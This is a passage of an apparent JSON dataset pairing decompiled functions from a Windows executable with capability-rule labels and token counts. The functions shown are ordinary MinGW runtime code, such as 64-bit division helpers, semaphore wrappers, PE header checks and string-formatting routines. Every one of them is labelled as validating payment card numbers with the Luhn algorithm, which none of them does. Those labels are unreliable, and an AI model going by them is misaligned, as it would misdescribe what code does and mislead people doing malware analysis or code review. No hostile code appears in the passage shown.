0x5b;\n        if (*param_1 != 0) {\ncode_r0x00416b81:\n            fcn.00411160();\n            iVar1 = *(in_EAX + 0x100);\n        }\n        if (iVar1 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar3 = 1;\n            iVar1 = 0;\n            goto code_r0x00416b9a;\n        }\n    }\n    else {\ncode_r0x00416b4b:\n        iVar3 = iVar1 + 1;\n        *(in_EAX + 0x100) = iVar3;\n        in_EAX[iVar1] = 0x20;\n        in_EAX[0x104] = 0x20;\ncode_r0x00416b5f:\n        if (iVar3 != 0xff) goto code_r0x00416b67;\n        in_EAX[0xff] = 0;\n        (**(in_EAX + 0x108))();\n        *in_EAX = 0x5b;\n        in_EAX[0x104] = 0x5b;\n        iVar3 = *param_1;\n        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n        *(in_EAX + 0x100) = 1;\n        if (iVar3 != 0) goto code_r0x00416b81;\n        iVar1 = 1;\n    }\n    iVar3 = iVar1 + 1;\ncode_r0x00416b9a:\n    *(in_EAX + 0x100) = iVar3;\n    in_EAX[iVar1] = 0x5d;\n    in_EAX[0x104] = 0x5d;\n    return;\ncode_r0x00416b20:\n    param_2 = *param_2;\n    if (param_2 == NULL) goto code_r0x00416b26;\n    goto code_r0x00416b15;\ncode_r0x00416b26:\n    fcn.00416740(0);\n    goto code_r0x00416b3a;\n}\n",
        "token_count": 1258
    },
    "004185e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.004185e0(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    piVar1 = in_EAX + *(in_EAX + 0x3c);\n    if (*piVar1 != 0x4550) {\n        return false;\n    }\n    return *(piVar1 + 6) == 0x10b;\n}\n",
        "token_count": 88
    },
    "004186f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004186f0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (*0x400000 != 0x5a4d) {\n        return 0;\n    }\n    iVar1 = fcn.004185e0();\n    if (iVar1 != 0) {\n        iVar1 = *0x40003c + 0x400018 + *(*0x40003c + 0x400014);\n        if (*(*0x40003c + 0x400006) != 0) {\n            uVar2 = 0;\n            do {\n                if ((*(iVar1 + 0xc) <= param_1 - 0x400000U) && (param_1 - 0x400000U < *(iVar1 + 0xc) + *(iVar1 + 8))) {\n                    return iVar1;\n                }\n                uVar2 = uVar2 + 1;\n                iVar1 = iVar1 + 0x28;\n            } while (uVar2 != *(*0x40003c + 0x400006));\n        }\n    }\n    return 0;\n}\n",
        "token_count": 258
    },
    "00418980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00418980(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint8_t uVar5;\n    int32_t iVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    \n    if (param_4 == 0) {\n        if (param_3 <= param_2) {\n            if (param_3 == 0) {\n                param_3 = 1 / 0;\n            }\n            return (param_2 % param_3 << 0x20 | param_1) / param_3 & 0xffffffff | param_2 / param_3 << 0x20;\n        }\n        uVar9 = 0;\n        iVar6 = CONCAT44(param_2, param_1) / param_3;\n    }\n    else {\n        if (param_2 < param_4) {\n            return 0;\n        }\n        uVar9 = 0x1f;\n        if (param_4 != 0) {\n            for (; param_4 >> uVar9 == 0; uVar9 = uVar9 - 1) {\n            }\n        }\n        uVar9 = uVar9 ^ 0x1f;\n        if (uVar9 == 0) {\n            if ((param_4 < param_2) || (iVar6 = 0,  param_3 <= param_1)) {\n                iVar6 = 1;\n            }\n        }\n        else {\n            uVar5 = uVar9;\n            uVar7 = 0x20 - uVar5;\n            uVar1 = param_4 << (uVar5 & 0x1f) | param_3 >> (uVar7 & 0x1f);\n            uVar2 = CONCAT44(param_2 >> (uVar7 & 0x1f), param_2 << (uVar5 & 0x1f) | param_1 >> (uVar7 & 0x1f));\n            uVar3 = uVar2 / uVar1;\n            iVar6 = uVar3;\n            uVar9 = uVar2 % uVar1;\n            iVar4 = (uVar3 & 0xffffffff) * (param_3 << (uVar5 & 0x1f));\n            uVar8 = iVar4 >> 0x20;\n            if ((uVar9 < uVar8) || ((param_1 << (uVar5 & 0x1f) < iVar4 && (uVar9 == uVar8)))) {\n                iVar6 = iVar6 + -1;\n                uVar9 = 0;\n            }\n            else {\n                uVar9 = 0;\n            }\n        }\n    }\n    return CONCAT44(uVar9, iVar6);\n}\n",
        "token_count": 653
    },
    "00418a80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00418a80(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    \n    if (param_4 == 0) {\n        if (param_2 < param_3) {\n            uVar6 = CONCAT44(param_2, param_1) % param_3;\n        }\n        else {\n            if (param_3 == 0) {\n                param_3 = 1 / 0;\n            }\n            uVar6 = (param_2 % param_3 << 0x20 | param_1) % param_3;\n        }\n        return uVar6;\n    }\n    if (param_4 <= param_2) {\n        uVar6 = 0x1f;\n        if (param_4 != 0) {\n            for (; param_4 >> uVar6 == 0; uVar6 = uVar6 - 1) {\n            }\n        }\n        if ((uVar6 ^ 0x1f) != 0) {\n            uVar3 = uVar6 ^ 0x1f;\n            uVar4 = 0x20 - uVar3;\n            uVar5 = param_4 << (uVar3 & 0x1f) | param_3 >> (uVar4 & 0x1f);\n            param_3 = param_3 << (uVar3 & 0x1f);\n            uVar9 = param_1 << (uVar3 & 0x1f);\n            uVar1 = CONCAT44(param_2 >> (uVar4 & 0x1f), param_1 >> (uVar4 & 0x1f) | param_2 << (uVar3 & 0x1f));\n            uVar7 = uVar1 % uVar5;\n            iVar2 = (uVar1 / uVar5 & 0xffffffff) * param_3;\n            uVar8 = iVar2 >> 0x20;\n            uVar6 = iVar2;\n            if ((uVar7 < uVar8) || ((uVar7 == uVar8 && (uVar9 < uVar6)))) {\n                bVar10 = uVar6 < param_3;\n                uVar6 = uVar6 - param_3;\n                uVar8 = (uVar8 - uVar5) - bVar10;\n            }\n            uVar5 = (uVar7 - uVar8) - (uVar9 < uVar6);\n            return CONCAT44(uVar5 >> (uVar3 & 0x1f), uVar5 << (uVar4 & 0x1f) | uVar9 - uVar6 >> (uVar3 & 0x1f));\n        }\n        if ((param_4 < param_2) || (param_3 <= param_1)) {\n            bVar10 = param_1 < param_3;\n            param_1 = param_1 - param_3;\n            param_2 = (param_2 - param_4) - bVar10;\n        }\n        return CONCAT44(param_2, param_1);\n    }\n    return CONCAT44(param_2, param_1);\n}\n",
        "token_count": 778
    },
    "00418d00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418d00(uint *param_1)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0xffffffff;\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)(0, 0, 0xffff, 0);\n    param_1[1] = uVar1;\n    return;\n}\n",
        "token_count": 78
    },
    "00418dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00418dc0(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    LOCK();\n    iVar1 = *param_1;\n    *param_1 = *param_1 + -1;\n    if (iVar1 + -1 < 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(param_1[1], 1, 0);\n    return iVar1 == 0;\n}\n",
        "token_count": 107
    },
    "00418e10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418e10(uint *param_1)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0xffffffff;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)(0, 0, 0xffff, 0);\n    param_1[3] = uVar1;\n    return;\n}\n",
        "token_count": 100
    },
    "00418f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00418f30(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = param_1[1];\n    param_1[1] = iVar1 + -1;\n    if (iVar1 + -1 == 0) {\n        param_1[2] = 0;\n        LOCK();\n        iVar1 = *param_1;\n        *param_1 = *param_1 + -1;\n        if (-1 < iVar1 + -1) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(param_1[3], 1, 0);\n            return iVar1 == 0;\n        }\n    }\n    return false;\n}\n",
        "token_count": 156
    },
    "0041b570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b570(int32_t param_1, code *param_2, int32_t param_3, int32_t param_4)\n\n{\n    uint *puVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    \n    iVar4 = param_3 * 2;\n    while( true ) {\n        iVar5 = iVar4 + 1;\n        if (param_4 <= iVar5) {\n            return;\n        }\n        puVar6 = param_1 + iVar5 * 4;\n        uVar3 = *puVar6;\n        if (iVar4 + 2 < param_4) {\n            puVar1 = param_1 + 4 + iVar5 * 4;\n            iVar2 = (*param_2)(in_EAX, uVar3, *puVar1);\n            if (iVar2 < 0) {\n                uVar3 = *puVar1;\n                iVar5 = iVar4 + 2;\n                puVar6 = puVar1;\n            }\n            else {\n                uVar3 = *puVar6;\n            }\n        }\n        puVar1 = param_1 + param_3 * 4;\n        iVar4 = (*param_2)(in_EAX, *puVar1, uVar3);\n        if (-1 < iVar4) break;\n        uVar3 = *puVar1;\n        *puVar1 = *puVar6;\n        iVar4 = iVar5 * 2;\n        *puVar6 = uVar3;\n        param_3 = iVar5;\n    }\n    return;\n}\n",
        "token_count": 370
    },
    "0041b6d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b6d0(void)\n\n{\n    *0x54940c = 0xffffffff;\n    *0x549410 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)(0, 0, 0xffff, 0);\n    return;\n}\n",
        "token_count": 61
    },
    "0041bdd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041bdd0(void)\n\n{\n    int32_t iVar1;\n    uint32_t uStack36;\n    uint32_t auStack32 [4];\n    \n    fcn.0041b950();\n    fcn.0041b760();\n    fcn.0041b7a0(&uStack36);\n    fcn.0041b950();\n    fcn.0041b760();\n    fcn.0041b7a0(auStack32);\n    iVar1 = 1;\n    if (uStack36 <= auStack32[0]) {\n        iVar1 = -(uStack36 < auStack32[0]);\n    }\n    return iVar1;\n}\n",
        "token_count": 150
    },
    "0041cd80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0041cd80(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t *in_EAX;\n    int32_t iVar5;\n    \n    uVar4 = in_EAX[1];\n    iVar2 = *in_EAX;\n    if (uVar4 < 5) {\n        iVar5 = sub.msvcrt.dll_malloc(iVar2 + 4);\n        if (iVar5 == 0) {\ncode_r0x004014e0:\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n            if (iVar2 == 0) {\n                *0x4ae004 = 0x41ca80;\n                pcVar3 = 0x41c830;\n            }\n            else {\n                *0x549df0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n                pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n                pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"__register_frame_info\");\n                *0x4ae004 = (*pcVar1)(iVar2, \"__deregister_frame_info\");\n            }\n            if (pcVar3 != NULL) {\n                (*pcVar3)(0x50c0f8, 0x54901c);\n            }\n            uVar4 = fcn.004014c0(fcn.00401590);\n            return uVar4;\n        }\n        *iVar5 = iVar5;\n        uVar4 = iVar5 + 4;\n        iVar5 = in_EAX[3];\n    }\n    else {\n        iVar5 = sub.msvcrt.dll_malloc(uVar4 + 3 + iVar2);\n        if (iVar5 == 0) goto code_r0x004014e0;\n        uVar4 = iVar5 + 3 + uVar4 & -uVar4;\n        *(uVar4 - 4) = iVar5;\n        iVar5 = in_EAX[3];\n    }\n    if (iVar5 != 0) {\n        sub.msvcrt.dll_memcpy(uVar4, iVar5);\n        return uVar4;\n    }\n    sub.msvcrt.dll_memset(uVar4, 0, iVar2);\n    return uVar4;\n}\n",
        "token_count": 547
    },
    "0041e070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nunkbyte10 fcn.0041e070(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint uStack24;\n    uint uStack20;\n    ushort uStack16;\n    ushort uStack14;\n    \n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack14 = 0;\n    iVar1 = fcn.0041d6c0(param_1, &uStack24);\n    if (param_2 != NULL) {\n        *param_2 = param_1 + iVar1;\n    }\n    return CONCAT28(uStack16, CONCAT44(uStack20, uStack24));\n}\n",
        "token_count": 157
    },
    "0041e0c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041e0c0(uchar *param_1, uint16_t param_2, int32_t param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint16_t auStack32 [8];\n    int32_t aiStack16 [4];\n    \n    auStack32[0] = param_2;\n    if (param_3 == 0) {\n        if (0xff < param_2) {\ncode_r0x0041e148:\n            puVar2 = sub.msvcrt.dll__errno();\n            *puVar2 = 0x2a;\n            return -1;\n        }\n        *param_1 = param_2;\n        iVar1 = 1;\n    }\n    else {\n        aiStack16[0] = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(param_3, 0, auStack32, 1, param_1, param_4, 0, aiStack16);\n        if ((iVar1 == 0) || (aiStack16[0] != 0)) goto code_r0x0041e148;\n    }\n    return iVar1;\n}\n",
        "token_count": 270
    },
    "0041e160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041e160(uchar *param_1, ushort param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uchar auStack17 [5];\n    \n    if (param_1 == NULL) {\n        param_1 = auStack17;\n    }\n    uVar1 = sub.msvcrt.dll____mb_cur_max_func();\n    uVar2 = fcn.00427b10();\n    fcn.0041e0c0(param_1, param_2, uVar2, uVar1);\n    return;\n}\n",
        "token_count": 123
    },
    "0041e2c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041e2c0(ushort param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    int32_t iVar4;\n    uchar uStack19;\n    ushort uStack18;\n    uint auStack16 [4];\n    \n    auStack16[0] = 0;\n    uStack18 = param_1;\n    uVar1 = fcn.00427b10();\n    iVar4 = 1;\n    puVar3 = &uStack18;\n    iVar2 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar1, 0, puVar3, 1, &uStack19, 1, 0, auStack16);\n    if ((iVar2 == 0) || (iVar4 != 0)) {\n        iVar2 = -1;\n    }\n    else {\n        iVar2 = puVar3 >> 8;\n    }\n    return iVar2;\n}\n",
        "token_count": 215
    },
    "0041e340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort fcn.0041e340(uint param_1)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    pcVar1 = \"alnum\";\n    iVar3 = 0;\n    while( true ) {\n        iVar2 = sub.msvcrt.dll_strcmp(param_1, pcVar1);\n        if (iVar2 == 0) {\n            return *(iVar3 * 8 + 0x505c64);\n        }\n        iVar3 = iVar3 + 1;\n        if (iVar3 == 0xb) break;\n        pcVar1 = *(iVar3 * 8 + 0x505c60);\n    }\n    return 0;\n}\n",
        "token_count": 153
    },
    "0041e9b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041e9b0(int32_t param_1, int32_t param_2, uint param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    \n    if (param_2 != 0) {\n        param_2 = param_2 + -1;\n        iVar1 = fcn.004237b0(0, param_1, param_2, param_3, param_4);\n        if (iVar1 < param_2) {\n            param_2 = iVar1;\n        }\n        *(param_1 + param_2) = 0;\n        return;\n    }\n    fcn.004237b0(0, param_1, 0, param_3, param_4);\n    return;\n}\n",
        "token_count": 167
    },
    "00421fc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421fc0(uint param_1, int32_t *param_2)\n\n{\n    uchar in_AL;\n    int32_t iVar1;\n    \n    if (((param_2[1] & 0x4000U) != 0) || (iVar1 = param_2[8],  param_2[9] != iVar1 && iVar1 <= param_2[9])) {\n        if ((param_2[1] & 0x2000U) != 0) {\n            sub.msvcrt.dll_fputc();\n            param_2[8] = param_2[8] + 1;\n            return;\n        }\n        *(*param_2 + param_2[8]) = in_AL;\n        iVar1 = param_2[8];\n    }\n    param_2[8] = iVar1 + 1;\n    return;\n}\n",
        "token_count": 191
    },
    "00422020": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422020(int32_t param_1, int32_t param_2)\n\n{\n    ushort *in_EAX;\n    int32_t iVar1;\n    uchar *puVar2;\n    ushort *puStack68;\n    int32_t iStack64;\n    uchar auStack48 [4];\n    uchar auStack44 [28];\n    \n    fcn.0041e160(auStack44, 0, auStack48);\n    iStack64 = *(param_1 + 0xc);\n    if ((param_2 <= iStack64) || (iStack64 < 0)) {\n        iStack64 = param_2;\n    }\n    puStack68 = in_EAX;\n    if (iStack64 < *(param_1 + 8)) {\n        iVar1 = *(param_1 + 8) - iStack64;\n        *(param_1 + 8) = iVar1;\n        if ((*(param_1 + 5) & 4) == 0) {\n            *(param_1 + 8) = iVar1 + -1;\n            do {\n                fcn.00421fc0();\n                iVar1 = *(param_1 + 8);\n                *(param_1 + 8) = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    else {\n        *(param_1 + 8) = 0xffffffff;\n    }\n    for (; 0 < iStack64; iStack64 = iStack64 + -1) {\n        iVar1 = fcn.0041e160(auStack44, *puStack68, auStack48);\n        if (iVar1 < 1) break;\n        puVar2 = auStack44;\n        do {\n            puVar2 = puVar2 + 1;\n            fcn.00421fc0();\n        } while (puVar2 != auStack44 + iVar1);\n        puStack68 = puStack68 + 1;\n    }\n    while (iVar1 = *(param_1 + 8),  *(param_1 + 8) = iVar1 + -1,  0 < iVar1) {\n        fcn.00421fc0();\n    }\n    return;\n}\n",
        "token_count": 481
    },
    "00422140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422140(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(param_1 + 0xc);\n    if ((param_2 <= iVar2) || (iVar2 < 0)) {\n        iVar2 = param_2;\n    }\n    if (iVar2 < *(param_1 + 8)) {\n        iVar1 = *(param_1 + 8) - iVar2;\n        *(param_1 + 8) = iVar1;\n        if ((*(param_1 + 5) & 4) == 0) {\n            *(param_1 + 8) = iVar1 + -1;\n            do {\n                fcn.00421fc0();\n                iVar1 = *(param_1 + 8);\n                *(param_1 + 8) = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        if (iVar2 == 0) goto code_r0x0042219d;\n    }\n    else {\n        *(param_1 + 8) = 0xffffffff;\n        if (iVar2 == 0) {\n            *(param_1 + 8) = 0xfffffffe;\n            return;\n        }\n    }\n    iVar2 = iVar2 + in_EAX;\n    do {\n        in_EAX = in_EAX + 1;\n        fcn.00421fc0();\n    } while (in_EAX != iVar2);\n    iVar2 = *(param_1 + 8);\n    *(param_1 + 8) = iVar2 + -1;\n    while (0 < iVar2) {\n        fcn.00421fc0();\ncode_r0x0042219d:\n        iVar2 = *(param_1 + 8);\n        *(param_1 + 8) = iVar2 + -1;\n    }\n    return;\n}\n",
        "token_count": 427
    },
    "00422200": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422200(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    int32_t iVar2;\n    \n    if (in_EAX == 0) {\n        in_EAX = 0x505fa0;\n    }\n    if (*(param_2 + 0xc) < 0) {\n        iVar1 = sub.msvcrt.dll_strlen(in_EAX);\n    }\n    else {\n        iVar1 = fcn.00427760(in_EAX, *(param_2 + 0xc));\n    }\n    iVar2 = *(param_2 + 0xc);\n    if ((iVar1 <= iVar2) || (iVar2 < 0)) {\n        iVar2 = iVar1;\n    }\n    if (iVar2 < *(param_2 + 8)) {\n        iVar1 = *(param_2 + 8) - iVar2;\n        *(param_2 + 8) = iVar1;\n        if ((*(param_2 + 5) & 4) == 0) {\n            *(param_2 + 8) = iVar1 + -1;\n            do {\n                fcn.00421fc0(unaff_EBX, unaff_ESI);\n                iVar1 = *(param_2 + 8);\n                *(param_2 + 8) = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        if (iVar2 == 0) goto code_r0x0042219d;\n    }\n    else {\n        *(param_2 + 8) = 0xffffffff;\n        if (iVar2 == 0) {\n            *(param_2 + 8) = 0xfffffffe;\n            return;\n        }\n    }\n    iVar2 = iVar2 + in_EAX;\n    do {\n        in_EAX = in_EAX + 1;\n        fcn.00421fc0(unaff_EBX, unaff_ESI);\n    } while (in_EAX != iVar2);\n    iVar1 = *(param_2 + 8);\n    *(param_2 + 8) = iVar1 + -1;\n    while (0 < iVar1) {\n        fcn.00421fc0(unaff_EBX, unaff_ESI);\ncode_r0x0042219d:\n        iVar1 = *(param_2 + 8);\n        *(param_2 + 8) = iVar1 + -1;\n    }\n    return;\n}\n",
        "token_count": 549
    },
    "00422300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00422300(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    ulong uVar6;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_bp_ch;\n    uint uStack80;\n    uchar *apuStack76 [2];\n    int32_t iStack68;\n    uint *puStack64;\n    uchar auStack60 [12];\n    uchar *var_2ch_2;\n    int16_t var_1eh_2;\n    uint var_1ch_2;\n    \n    var_2ch_2 = &stack0xffffffb4;\n    if (*(in_EAX + 0x10) == -3) {\n        var_1ch_2 = 0;\n        uStack80 = 0x422390;\n        puVar3 = sub.msvcrt.dll_localeconv();\n        puStack64 = &fcn.00422300::var_1ch_2;\n        iStack68 = 0x10;\n        apuStack76[1] = *puVar3;\n        apuStack76[0] = &stack0xffffffde;\n        uStack80 = 0x4223b0;\n        iVar4 = fcn.0041d4f0();\n        if (iVar4 < 1) {\n            var_1eh_2 = *(in_EAX + 0x14);\n        }\n        else {\n            *(in_EAX + 0x14) = var_1eh_2;\n        }\n        *(in_EAX + 0x10) = iVar4;\n    }\n    else {\n        var_1eh_2 = *(in_EAX + 0x14);\n    }\n    if (var_1eh_2 == 0) {\n        uStack80 = 0x42237c;\n        fcn.00421fc0();\n        return;\n    }\n    uStack80 = 0x42232b;\n    uVar6 = fcn.00418950();\n    iVar4 = -uVar6;\n    var_1ch_2 = 0;\n    puVar5 = &stack0xffffffc4 + iVar4;\n    *(&stack0xffffffb8 + iVar4) = uVar6 >> 0x20;\n    *(&stack0xffffffbc + iVar4) = &fcn.00422300::var_1ch_2;\n    *(&stack0xffffffb4 + iVar4) = puVar5;\n    *(&stack0xffffffb0 + iVar4) = 0x42234b;\n    iVar2 = fcn.0041e160();\n    if (iVar2 < 1) {\n        *(&stack0xffffffb0 + iVar4) = 0x4223d0;\n        fcn.00421fc0();\n    }\n    else {\n        puVar1 = puVar5 + iVar2;\n        do {\n            puVar5 = puVar5 + 1;\n            *(&stack0xffffffb0 + iVar4) = 0x422360;\n            fcn.00421fc0();\n        } while (puVar5 != puVar1);\n    }\n    return;\n}\n",
        "token_count": 722
    },
    "00422750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00422750(unkbyte10 param_1)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iStack32;\n    uint uStack28;\n    uint uStack24;\n    ushort uStack20;\n    ushort uStack18;\n    \n    if (*(in_EAX + 0xc) < 0) {\n        *(in_EAX + 0xc) = 6;\n    }\n    uStack28 = param_1;\n    uStack24 = param_1 >> 0x20;\n    uStack20 = param_1 >> 0x40;\n    uVar2 = fcn.00421ec0(uStack28, uStack24, CONCAT22(uStack18, uStack20));\n    if (iStack32 != -0x8000) {\n        fcn.004223e0();\n        while (iVar1 = *(in_EAX + 8),  *(in_EAX + 8) = iVar1 + -1,  0 < iVar1) {\n            fcn.00421fc0();\n        }\n        fcn.00424170(uVar2);\n        return;\n    }\n    fcn.00422260();\n    fcn.00424170(uVar2);\n    return;\n}\n",
        "token_count": 281
    },
    "00422c00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00422c00(unkbyte10 param_1)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iStack32;\n    uint uStack28;\n    uint uStack24;\n    ushort uStack20;\n    ushort uStack18;\n    \n    if (*(in_EAX + 0xc) < 0) {\n        *(in_EAX + 0xc) = 6;\n    }\n    uStack28 = param_1;\n    uStack24 = param_1 >> 0x20;\n    uStack20 = param_1 >> 0x40;\n    uVar1 = fcn.00421ec0(uStack28, uStack24, CONCAT22(uStack18, uStack20));\n    if (iStack32 == -0x8000) {\n        fcn.00422260();\n        fcn.00424170(uVar1);\n        return;\n    }\n    fcn.00422b20();\n    fcn.00424170(uVar1);\n    return;\n}\n",
        "token_count": 226
    },
    "00422cb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00422cb0(unkbyte10 param_1)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uint uStack24;\n    ushort uStack20;\n    ushort uStack18;\n    \n    if (*(in_EAX + 0xc) < 0) {\n        *(in_EAX + 0xc) = 6;\n    }\n    else if (*(in_EAX + 0xc) == 0) {\n        *(in_EAX + 0xc) = 1;\n    }\n    uStack28 = param_1;\n    uStack24 = param_1 >> 0x20;\n    uStack20 = param_1 >> 0x40;\n    uVar1 = fcn.00421ec0(uStack28, uStack24, CONCAT22(uStack18, uStack20));\n    if (iStack32 != -0x8000) {\n        uVar2 = *(in_EAX + 4) & 0x800;\n        if ((-4 < iStack32) && (iStack32 <= *(in_EAX + 0xc))) {\n            if (uVar2 == 0) {\n                iVar3 = sub.msvcrt.dll_strlen(uVar1);\n                iVar3 = iVar3 - iStack32;\n                *(in_EAX + 0xc) = iVar3;\n                if ((iVar3 < 0) && (0 < *(in_EAX + 8))) {\n                    *(in_EAX + 8) = iVar3 + *(in_EAX + 8);\n                }\n            }\n            else {\n                